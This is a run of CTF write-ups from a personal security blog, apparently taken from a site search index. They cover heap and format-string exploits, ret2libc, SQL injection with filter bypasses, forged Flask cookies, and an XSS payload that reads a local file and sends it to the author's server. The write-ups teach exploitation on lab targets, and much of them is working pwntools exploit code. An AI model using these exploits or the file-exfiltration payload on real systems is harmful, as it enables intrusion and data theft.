this at 4 am and i had to complete my annoying homework tomorrow in the lunch break.\nFor those asking i didn\u0026rsquo;t get any bounties for this , i didn\u0026rsquo;t even expect that xd\nThank you for reading this article, i hope you enjoyed your ride, don\u0026rsquo;t forget to take a look at my previous articles and follow me on twitter for more exciting content :D\n","date":1590570000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1590570000,"objectID":"d6b01c8c107a69f1038d70c21126a024","permalink":"https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/","publishdate":"2020-05-27T09:00:00Z","relpermalink":"/post/how_i_hacked_a_famous_tunisian_pizza_vendor/","section":"post","summary":"How i hacked a famous pizza vendor in Tunisia ? Generally i\u0026rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D It\u0026rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :( and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook.","tags":null,"title":"How i hacked a famous pizza vendor in Tunisia ?","type":"post"},{"authors":null,"categories":null,"content":"To make sure that i learned something well , i always want to write an article about that topic and it\u0026rsquo;ll be an opportunity to do more researchs about it. The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys \u0026lt;3 anyway that\u0026rsquo;s why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .\nNote: This article assumes that you have basic knowledge of assembly and C language\nSummary 1- Jump Not Found From UMD CTF : heap based overflow\n2- Dorsia3 From WPI CTF: Format string Vulnerability\nJump Not Found 400pts (25 solves) Note: You can Download the binary HERE, give it a try alone before reading the writeup that\u0026rsquo;s the best way to LEARN .\nTL;DR   Exploit a Heap based overflow to overwrite a function address with the Win function address\n  Bypass a little problem of the presence of \u0026ldquo;0x0a\u0026rdquo;(\u0026quot;\\n\u0026rdquo;) in the Win function address\n  Introduction Before diving into the exploitation part , let\u0026rsquo;s talk about the heap section ,you have probably heard or used malloc or calloc functions in C , these functions are used to allocate memory on the heap,it is a region of your computer\u0026rsquo;s memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.\nThe allocation algorithm in an abstract way is quite simple , we won\u0026rsquo;t dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it\u0026rsquo;s reserved in the heap and malloc returns the address of the beginning of the chunk where we can store the data we want.\nYou may be asking how your computer knows where the next free chunk starts ? That\u0026rsquo;s quite simple, before each allocated chunk its size is allocated just before it, so the address of the next free chunk will be :\n Address of the beginning of chunk1 + Its size\n This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D\nExploitation Let the fun begin now :D after downloading the binary let\u0026rsquo;s do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.\nObserving the main function , we can notice that it\u0026rsquo;s allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .\nlocal_20 = (char *)malloc(0x42); local_18 = (code **)malloc(0x18); *local_18 = jumpToHoth; local_18[1] = jumpToCoruscant; local_18[2] = jumpToEndor;  Of course as the most vigilant readers noticed , it\u0026rsquo;s using the dangerous function gets so we have the possibility to overflow stuffs :D Now here is our plan:\nWe will abuse the gets function and overwrite the jumpToHoth address with jumpToNaboo function which will prints the flag for us Before that we need to figure out the offset so let\u0026rsquo;s open the binary in gdb, set a breakpoint after gets and enter a simple pattern\nAfter that let\u0026rsquo;s visualize the interesting part of the heap\nAs you can see the \u0026ldquo;AAAAAAAABBBBBBBB\u0026rdquo; that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let\u0026rsquo;s begin writing our exploit :\nfrom pwn import * p=process(\u0026quot;./JNF\u0026quot;) #p=remote(\u0026quot;192.241.138.174\u0026quot;,9996) p.recvuntil(\u0026quot;CONSOLE\u0026gt;\u0026quot;) WIN=p64(0x000000000040070e) OFFSET=\u0026quot;1\u0026quot;+\u0026quot;A\u0026quot;*79 payload=OFFSET payload+=WIN p.sendline(payload) log.info(\u0026quot;Found Flag ! \u0026quot;) p.interactive()  The reason why i wrote *OFFSET=\u0026quot;1\u0026quot;+\u0026quot;A\u0026rdquo;79 is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.\ngets(local_20); lVar2 = strtol(local_20,\u0026amp;local_28,10); *(short *)(local_20 + 0x40) = (short)lVar2; sVar1 = *(short *)(local_20 + 0x40); if (sVar1 != 2) break; puts(\u0026quot;Checking navigation...\u0026quot;); (*local_18[1])(); } if (2 \u0026lt; sVar1) break; if (sVar1 == 1) { .....  Why 0x000000000040070e not the real address 0x000000000040070a\nAs we know gets function stops when it encounters \u0026ldquo;\\n\u0026rdquo; (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :( Fortunately observing the assembly code of jumpToNaboo function we will see that we can start from the address that holds the part we want , which is printing the flag :\nAnd Finally running the exploit will bring the flag for us :D\nThat was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let\u0026rsquo;s pass now to the second task which is a format string vulnerability.\nDorsia3 250pts (55 solves) Note: You can Download the binary HERE and the libc HERE, give it a try alone before reading the writeup that\u0026rsquo;s the best way to LEARN .\nTL;DR  Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget  Introduction As a quick introduction this is a brief explanation of the format string vulnerability :\n format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack. Wikipedia\n A quick Example :\nIf things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D\nExploitation In this task we are given the source code of the task , the binary and the libc .\nAs you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.\nLet\u0026rsquo;s do some static analysis , running the file and checksec commands , we get these results:\nSo we have a 32 bit binary with PIE and NX protections enabled , so we won\u0026rsquo;t be able to overwrite the GOT entry of a function since its address is randomized .\nLet\u0026rsquo;s Get our hands dirty\nFirstly , let\u0026rsquo;s create a pad function to make sure that the offset won\u0026rsquo;t change and let\u0026rsquo;s find the offset of our format string to know exactly where our buffer starts.\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; p=process(\u0026quot;./nanoprint\u0026quot;) p.recvline() p.sendline(pad(\u0026quot;BAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|\u0026quot;)) p.interactive()  So our offset will be 7 , now let\u0026rsquo;s talk about our scenario , we will overwrite the saved eip with a one gadget from the libc ==\u0026gt; Spawn a shell \\o/\nWe have all we need , an address from the stack and the system function address from libc, so let\u0026rsquo;s write our exploit and retrieve these address properly\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; p=process(\u0026quot;./nanoprint\u0026quot;) #p=remote(\u0026quot;dorsia3.wpictf.xyz\u0026quot;,31337) data=p.recvline() BUFFER=int(data[:10],16) SYSTEM=int(data[-11:-1],16)+288 log.info(\u0026quot;Buffer starts: \u0026quot;+hex(BUFFER)) log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) pause() p.sendline(pad(\u0026quot;JUNK\u0026quot;)) p.interactive()  Since we have the libc binary let\u0026rsquo;s calculate the libc base , and using gdb lets run the first part of our exploit and try to figure the offset between our buffer and the saved eip :\n1- Run our little exploit\n2- run gdb with the following command:\n gdb -p `pidof nanoprint`\n So the offset is 0x71 ,finally let\u0026rsquo;s choose the one gadget , i have used the famous one_gadget tool\nAfter some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit\n 0x3d0e0 execve(\u0026quot;/bin/sh\u0026rdquo;, esp+0x40, environ)\n  constraints:\n  esi is the GOT address of libc\n  [esp+0x40] == NULL\n now we have everything we need let\u0026rsquo;s finish our exploit :\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; #p=process(\u0026quot;./nanoprint\u0026quot;) p=remote(\u0026quot;dorsia3.wpictf.xyz\u0026quot;,31337) data=p.recvline() BUFFER=int(data[:10],16) SYSTEM=int(data[-11:-1],16)+288 log.info(\u0026quot;Buffer starts: \u0026quot;+hex(BUFFER)) log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) BASE=SYSTEM-0x3d200 one_gadget=BASE+0x3d0e0 RET=BUFFER+0x71 RET2=RET+2 log.info(\u0026quot;Writing to: \u0026quot;+hex(RET)) payload=\u0026quot;B\u0026quot; payload+=p32(RET) payload+=p32(RET2) off1=(one_gadget \u0026amp; 0xffff)-9 #First 2 bytes off2=int(hex(one_gadget \u0026amp; 0xffff0000)[:-4],16)-(one_gadget \u0026amp; 0xffff) log.info(\u0026quot;one gadget address: \u0026quot;+hex(one_gadget)) log.info(\u0026quot;offset1 and 2: \u0026quot;+str(off1)+\u0026quot;|\u0026quot;+str(off2)) payload+=\u0026quot;%\u0026quot;+str(off1)+\u0026quot;x\u0026quot; payload+=\u0026quot;%7$hn\u0026quot; payload+=\u0026quot;%\u0026quot;+str(off2)+\u0026quot;x\u0026quot; payload+=\u0026quot;%8$hn\u0026quot; #pause() p.sendline(pad(payload)) p.interactive() #Offset buffer-ret : +0x71 #offset fmt 7  Running our exploit will spawn the shell for us \\o/\nThank you for reading the whole writeup :D I hope you liked it , you can check my github repo where i share my CTF writeups ! Arigatoo \\o/\n","date":1587412800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1587412800,"objectID":"38cc1f3fbd3cc44a3fe78f7c61512b36","permalink":"https://ahmed-belkahla.me/post/detailed-pwn-writeups/","publishdate":"2020-04-20T20:00:00Z","relpermalink":"/post/detailed-pwn-writeups/","section":"post","summary":"Detailed binary exploitation writeups from UMD CTF and WPICTF , heap based overflow and format string vulnerability.","tags":null,"title":"Detailed Writeups - Binary Exploitation","type":"post"},{"authors":null,"categories":null,"content":"Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D\nBabyWeb1(722pts)(10 solves) In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.\nTrying to post a picture with the same title of the posted pictures will be denied so let\u0026rsquo;s try SQL truncation attack and submit a picture with these details :\n Title : \u0026ldquo;naaah \u0026quot; url : \u0026ldquo;anything here\u0026rdquo; -msg : \u0026ldquo;anything\u0026rdquo;  And Bingo it passed the title check and we got a password :D\nUsing this password will give us the details of the picture and the flag if we check the source code :D\nInsecure(884pts)(4 solves) I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.\nAccessing this url will give us the first part (The same bucket where Hackzone Logo is stored)\n https://storage.googleapis.com/hzviii/flag_part1.txt\n 1st Part: HZVIII{Buck3t_M1sc0nf1gur4t1on_\nLet\u0026rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files . It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd\nAfter some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it\u0026rsquo;s using phantom Js to convert this text .\nOur scenario now is revealed , we\u0026rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered . I passed a lot of time in this part and tried a lot with basically this payload but i didn\u0026rsquo;t get anything :\n\u0026lt;img src=\u0026quot;aa\u0026quot; onerror=\u0026quot;function reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener('load', reqListener); oReq.open('GET', 'file:///psycor/flag_part2.txt'); oReq.send();\u0026quot;\u0026gt;  I have than tried to read it using iframes but i didn\u0026rsquo;t have any results :'(\nThis was really painful xd i thinked that maybe using onerror attribute , phantom Js won\u0026rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it\u0026rsquo;s filtered so all we have to do is bypass this filter :D\nAs we see in the picture below , the script word is stripped so what if we enter :\n scscriptript\n The script word will be stripped and Bingo we will have our script tag , let\u0026rsquo;s try it\nYeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :\n\u0026lt;scscriptript src=\u0026quot;http://100.26.206.184:1234/test.js\u0026quot;\u0026gt;\u0026lt;/scscriptript\u0026gt;  NOTE : It\u0026rsquo;s my VPS IP so DONT use it :D\nAnd i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below\nfunction reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener(\u0026quot;load\u0026quot;, reqListener); oReq.open(\u0026quot;GET\u0026quot;, \u0026quot;file:///psycor/flag_part2.txt\u0026quot;); oReq.send();  And yees we received an answer :D\nBase64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts\nCalculator(722pts)(10 solves) This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D\nWe will now leak the Secret key of the app and sign a session cookie that has the attribute \u0026ldquo;is_admin\u0026rdquo; set to True .\nTo do that we will use flask-unsign tool with the following command :\n flask-unsign \u0026ndash;sign \u0026ndash;cookie \u0026ldquo;{\u0026lsquo;is_admin\u0026rsquo;: True}\u0026rdquo; \u0026ndash;secret \u0026lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8\u0026rsquo; \u0026ndash;legacy\n And changing the cookie will give us the flag !\nI want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn\u0026rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1\n","date":1586650244,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1586650244,"objectID":"1c5a2f32bd14bf04489c0075204d25df","permalink":"https://ahmed-belkahla.me/post/hackzone-viii/","publishdate":"2020-04-12T00:10:44Z","relpermalink":"/post/hackzone-viii/","section":"post","summary":"Web writeups for Hackzone VIII CTF","tags":null,"title":"HackZone VIII - Web Writeups","type":"post"},{"authors":null,"categories":null,"content":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1\nfrom pwn import * p=remote(\u0026quot;pwn1-01.play.midnightsunctf.se\u0026quot;,10001) #p=process(\u0026quot;./pwn1\u0026quot;) OFFSET=cyclic(72) POP_RDI_RET=p64(0x0000000000400783) PUTS=p64(0x0000000000400550) LEAK=p64(0x602020) MAIN=p64(0x400698) payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN log.info(\u0026quot;Payload Crafted\u0026quot;) p.recvuntil(\u0026quot;buffer:\u0026quot;) log.info(\u0026quot;Sending payload\u0026quot;) #raw_input(\u0026quot;attach\u0026quot;) p.sendline(payload) data=p.recvline().strip() leak=u64(data.ljust(8,\u0026quot;\\x00\u0026quot;)) BASE_LIBC=leak-0x64e80 # local 0x54a20 log.info(\u0026quot;leaked libc base: \u0026quot;+hex(BASE_LIBC)) p.recvuntil(\u0026quot;buffer:\u0026quot;) #BINSH=p64(BASELIBC+0x183cee) #SYSTEM=p64(BASELIBC+0x46ed0) RET=p64(0x0000000000400536) SYSTEM=p64(BASE_LIBC+0x4f440) BINSH=p64(BASE_LIBC+0x1b3e9a) payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM p.sendline(payload) p.interactive()  NOTE: Check Task files ** HERE **\npwn2(80pts) It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1\nfrom pwn import * def extract(add,n): p1=\u0026quot;0x\u0026quot;+add[-4:] p2=add[:6] if n==1: return p1 if n==2: return p2 def pad(payload): return payload+\u0026quot;X\u0026quot;*(63-len(payload)) #p=process(\u0026quot;./pwn2\u0026quot;) p=remote(\u0026quot;pwn2-01.play.midnightsunctf.se\u0026quot;,10002) p.recvuntil(\u0026quot;input:\u0026quot;) EXITGOT=p32(0x804b020) EXITGOT2=p32(0x804b020+2) ''' s=\u0026quot;\u0026quot; for i in range(27,34): s+=\u0026quot;%\u0026quot;+str(i)+\u0026quot;$p \u0026quot; ''' payload=EXITGOT+EXITGOT2 payload+=\u0026quot;%2044x%8$hn%32231x%7$hn\u0026quot; #raw_input(\u0026quot;attach\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(pad(\u0026quot;%30$x\u0026quot;)) data=p.recvuntil(\u0026quot;X\u0026quot;) printf=int(\u0026quot;0x\u0026quot;+data[-9:-1],16)-5 LIBCBASE=printf-0x50b60 log.info(\u0026quot;Leaked Libc Base : \u0026quot;+hex(LIBCBASE)) p.recvuntil(\u0026quot;input:\u0026quot;) PRINTFGOT=p32(0x804b00c) PRINTFGOT2=p32(0x804b00c+2) SYSTEM=LIBCBASE+0x3cd10 log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) payload=PRINTFGOT payload+=PRINTFGOT2 p1=int(extract(hex(SYSTEM),1),16) p2=int(extract(hex(SYSTEM),2),16) log.info(\u0026quot;P1: \u0026quot;+str(p1-8)+\u0026quot; P2: \u0026quot;+str(p2-p1)) payload+=\u0026quot;%\u0026quot;+str(p1-8)+\u0026quot;x%7$hn%\u0026quot;+str(p2-p1)+\u0026quot;x%8$hn\u0026quot; log.info(\u0026quot;Payload crafted\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(\u0026quot;/bin/sh\u0026quot;) p.interactive() #Main address 0x80485eb # 7 stack adress  NOTE: Task files  HERE\nThese tasks were really fun, i\u0026rsquo;m sorry for the lack of details because i\u0026rsquo;m really busy this period :(\n","date":1585958400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585958400,"objectID":"525946de77e6864e40805467cb9a5d55","permalink":"https://ahmed-belkahla.me/post/midnight-sun-ctfquals/","publishdate":"2020-04-04T00:00:00Z","relpermalink":"/post/midnight-sun-ctfquals/","section":"post","summary":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1","tags":null,"title":"Midnight Sun CTF Quals 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address\nThe idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it\u0026rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :\nfrom pwn import * import struct import sys def pad(str): return str+\u0026quot;X\u0026quot;*(32-len(str)) payload=\u0026quot;\u0026quot; #p=process(\u0026quot;./b64decoder\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,2783) d=p.recvuntil(\u0026quot;name!\u0026quot;) A64Ladd=d[:-18][-10:] TOWRITE=\u0026quot;0x\u0026quot;+A64Ladd[-4:] sys=int(TOWRITE,16)-1680-4 #A64l-0x690 log.info(TOWRITE) log.info(sys) A64L_PLT=0x804b398 a64lADD=p32(A64L_PLT) payload+=a64lADD payload+=\u0026quot;%\u0026quot;+str(sys)+\u0026quot;x%71$hn\u0026quot; log.info(\u0026quot;payload crafted\u0026quot;) p.sendline(payload) log.info(\u0026quot;Sent , Haaaw el shell\u0026quot;) p.interactive()  And Bingo we got our shell :D\nNOTE: Task files  HERE\nTROLL (50pts) In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed value to the time and finally the beginning of the loop and generating the random numbers and questions each time .\nMy idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored\nMy input :\n AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\n I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored) hold the value of \u0026ldquo;MMMM\u0026rdquo; so if we replace \u0026ldquo;MMMM\u0026rdquo; with the value we want , this value will be the seed for the random numbers.\nI have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; int main(int argc, char *argv[]){ int i=0; int seed=3472328296227680305 //0x1000 in decimal srand(seed); for(i=0;i\u0026lt;=99;i++){ int a=rand()% 100000 + 1; printf(\u0026quot;%d\\n\u0026quot;,a); } return 0; }  After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated\nfrom pwn import * #p=process(\u0026quot;./troll\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,4765) p.recvuntil(\u0026quot;Who goes there?\u0026quot;) SEED=\u0026quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000\u0026quot; p.sendline(SEED) log.info(\u0026quot;Sent First payload\u0026quot;) answers=open(\u0026quot;answer\u0026quot;,\u0026quot;r\u0026quot;) for line in answers: p.recvuntil(\u0026quot;What is it?\u0026quot;) log.info(\u0026quot;sending answer: \u0026quot;+line) p.sendline(line) p.interactive()  Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :\nNOTE: Task files  HERE\nThis is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1\n","date":1585526400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585526400,"objectID":"8885cf0419d47e79f6839de4334aaead","permalink":"https://ahmed-belkahla.me/post/tamuctfpwn/","publishdate":"2020-03-30T00:00:00Z","relpermalink":"/post/tamuctfpwn/","section":"post","summary":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address","tags":null,"title":"TAMU CTF 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D\nAfter the basic enumeration we can notice that these characters are filtered : [\u0026rdquo; \u0026ldquo;,\u0026quot;-\u0026quot;,\u0026quot;,\u0026quot;] so we will use the following bypasses:\n The white space : %0A The \u0026ldquo;-\u0026rdquo; : we will use # to comment The \u0026ldquo;,\u0026rdquo; : we will use join to bypass it  This step took me some time , after some tries i succeeded in equilibrating the query :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23\n And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual\n Tables:   ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23\n Table name: secrets\nColumns:   ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=\u0026quot;secrets\u0026rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23\n The interesting Column name : value\nAnd finally :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23\n Damn no flag for us :'( but no problem maybe if we just do load_file(\u0026ldquo;flag.txt\u0026rdquo;) we will have the flag ? unfortunately it wont work, in fact it\u0026rsquo;s not that easy and this is the most juicy part of the task xd i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D\n To limit the location in which files can be read and written, set the secure_file_priv system variable to a specific directory. See Section 5.1.8, â€œServer System Variablesâ€.\n So probably the author have set a custom location in the global variable secure_file_priv , let\u0026rsquo;s check its value in @@GLOBAL.secure_file_priv\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23\n BINGOOO ! so let\u0026rsquo;s have our flag now :\n ?search=\u0026rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(\u0026quot;/var/lib/mysql-files/flag/flag.txt\u0026rdquo;))b%0Ajoin%0A(select%0A3)c)%0A%23\n FLAG : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don\u0026rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D\n","date":1584921600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584921600,"objectID":"8fc0821de4f778391335b6e40e77170d","permalink":"https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/","publishdate":"2020-03-23T00:00:00Z","relpermalink":"/post/the-after-prequalsecurinetsquals/","section":"post","summary":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D","tags":null,"title":"The After Prequal - Securinets Quals 2k20","type":"post"},{"authors":null,"categories":null,"content":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD\nAfter Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it\nAfter cloning the project here is its structure\n git clone https://github.com/mohamedaymenkarmous/virustotal-api-html\n let\u0026rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the shell_exec function :D Interesting hmmm\nshell_exec is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful\n$command = \u0026quot;../VirusTotal.py '$scanned_ip'\u0026quot;; $output = shell_exec($command);  But unfortunately there\u0026rsquo;s too much restriction on our input :( it\u0026rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )\nif(isset($_POST) \u0026amp;\u0026amp; !empty($_POST)){ $scanned_ip=isset($_POST['ip']) \u0026amp;\u0026amp; !empty($_POST['ip']) \u0026amp;\u0026amp; !is_array($_POST['ip']) ? $_POST['ip'] : \u0026quot;\u0026quot;; if(!$scanned_ip){header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();} if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) { } else {header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();}  Let\u0026rsquo;s proceed , it seems that the index.php is pretty safe ,let\u0026rsquo;s take a look at the VirusTotal.py script\nOMG :'( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website, when we enter the ip address it asks the Virus Total API for the results and then there\u0026rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads the results from the database .\nSo if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors \u0026lt;3 ) i found something interesting :D\nbefore we proceed here\u0026rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)\ndef persistURLs(self,selected_ips,ip_report_filtered): attr=\u0026quot;detected_urls\u0026quot; table_name=\u0026quot;vt_scanned_urls_table\u0026quot; newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name) selected_urls_filtered=[] for selected_url in selected_urls: selected_urls_filtered.append(selected_url['url']) if newAttr in ip_report_filtered: for url in ip_report_filtered[newAttr]: print(url['URL']) if url['URL'] not in selected_urls_filtered: try: self.CursorRW.execute(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) self.DBRW.commit() self.resetSQL() except Exception as e: 